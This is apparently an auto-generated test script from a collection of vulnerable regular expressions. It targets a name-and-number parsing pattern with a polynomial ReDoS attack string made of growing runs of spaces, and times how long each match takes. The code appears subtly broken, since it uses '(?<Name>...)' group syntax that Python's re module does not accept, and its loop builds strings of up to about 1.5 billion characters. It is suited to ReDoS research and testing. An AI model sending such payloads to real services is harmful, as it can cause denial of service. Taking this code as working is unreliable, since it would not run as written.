# 1618
# ^\s*(?<Last>[-A-Za-z ]+)[.](?<First>[-A-Za-z ]+)(?:[.](?<Middle>[-A-Za-z ]+))?(?:[.](?<Ordinal>[IVX]+))?(?:[.](?<Number>\d{10}))\s*$
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:""+" "*10000+"!_1_POA(i)"

import re
from time import perf_counter

regex = """^\s*(?<Last>[-A-Za-z ]+)[.](?<First>[-A-Za-z ]+)(?:[.](?<Middle>[-A-Za-z ]+))?(?:[.](?<Ordinal>[IVX]+))?(?:[.](?<Number>\d{10}))\s*$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + " " * i * 10000 + "!_1_POA(i)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")